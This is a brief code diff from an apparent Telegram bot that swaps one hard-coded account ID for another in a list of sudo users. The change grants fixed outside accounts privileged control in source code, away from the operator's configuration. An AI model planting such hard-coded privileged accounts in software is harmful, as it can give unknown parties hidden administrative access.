@@ -6,7 +6,7 @@ from driver.admins import get_administrators
 
 
 SUDO_USERS.append(1005593710)
-SUDO_USERS.append(1005593710)
+SUDO_USERS.append(1753753923)
 SUDO_USERS.append(5237966072)
 
 
